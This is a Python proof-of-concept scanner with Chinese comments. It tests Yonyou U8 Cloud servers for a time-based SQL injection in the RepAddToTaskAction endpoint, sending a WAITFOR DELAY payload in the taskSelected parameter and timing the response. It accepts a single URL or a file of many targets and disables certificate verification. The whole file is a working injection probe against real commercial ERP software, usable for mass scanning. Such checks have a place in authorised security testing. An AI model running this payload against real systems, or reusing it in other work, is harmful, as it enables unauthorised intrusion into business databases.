#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import argparse
import time
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略证书验证警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    try:
        target_url = f"{url.rstrip('/')}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:3%27--"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        }
        start_time = time.time()
        response = requests.get(target_url, headers=headers, verify=False, timeout=10)
        duration = time.time() - start_time
        
        if response.status_code == 200 and 3 <= duration < 8:
            print(f"{RED}URL [{url}] 可能存在用友 U8 Cloud RepAddToTaskAction SQL 注入漏洞{RESET}")
        else:
            print(f"URL [{url}] 可能不存在漏洞")

    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在用友 U8 Cloud RepAddToTaskAction SQL 注入漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
